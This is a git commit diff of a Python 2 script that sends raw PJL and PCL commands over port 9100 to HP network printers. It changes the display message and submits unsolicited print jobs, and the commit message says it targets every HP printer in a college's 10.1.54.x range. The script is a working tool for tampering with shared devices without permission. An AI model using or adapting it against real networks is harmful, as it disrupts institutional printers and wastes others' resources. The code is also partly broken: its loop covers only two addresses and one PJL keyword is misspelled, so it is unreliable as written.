8fab5e2b45a94e738bd46f15fdd92df9611782cf
Matej Kramny <matejkramny@gmail.com>
2013-04-29 12:44:43 +0200

    Print to everything in the IP range
    Prints message to all hp printers in college

--- Playing With Printer.py
+++ Playing With Printer.py
@@ -1,38 +1,37 @@
 #!/usr/bin/env python
 
-"""
-Insert custom messages into HP printer displays
-
-Works for most network-enabled HP printers.
-"""
-
 import socket
 import sys
 import os.path
-import random
 
-from time import sleep
+for i in [1,255]:
+    # Default configuration
+    host = '10.1.54.'+ str(i)
+    port = 9100 #9100 is the default port.
 
-messages = ["Hello World","All i do is print :-(", "Another network issue", "Please insert Coin!","Sleeping"]
-
-# Default configuration
-host = '10.1.54.6'
-port = 9100 #9100 is the default port.
-
-sock = socket.socket()
-try:
-    sock.connect((host, port))
-except socket.error, e:
-    sys.exit('Connection error %s: %s.' % (e[0], e[1]))
-
-print 'Connected'
-
-while True:
+    sock = socket.socket()
+    try:
+        sock.connect((host, port))
+    except socket.error, e:
+        print 'Connection error %s: %s.' % (e[0], e[1])
+        continue;
     
-    message = messages[random.randint(0,4)]
-
-    print 'Setting ready message to "%s" on %s' % (message, host)
-    command = "\x1B%%-12345X@PJL RDYMSG DISPLAY = \"%s\"\r\n\x1B%%-12345X\r\n" % message
+    print 'Connected'
+    
+    title = "Title"
+    job = "Job name"
+    message = "Hello there"
+    copies = "2"
+    
+    command = "\x1B%%-12345X@PJL RDYMSG DISPLAY = \"%s\"\r\n" % message
+    command = command + "@PJL JOB NAME = \"%s\"\r\n" % job
+    command = command + "@PJL SET COPES = %s\r\n" % copies
+    command = command + "@PJL SET RET = OFF\r\n"
+    command = command + "@PJL ENTER LANGUAGE = PCL\r\n"
+    command = command + "\x1B\r\n%s\x1BE\7E\x1B%%-12345X@PJL \r\n" % message
+    command = command + "@PJL EOJ\r\n"
+    command = command + "\x1B%%-12345X\r\n"
+    
+    print 'Sending print job to %s title %s' % (host, title)
+    
     sock.sendall(command)
-    sleep(5)
-
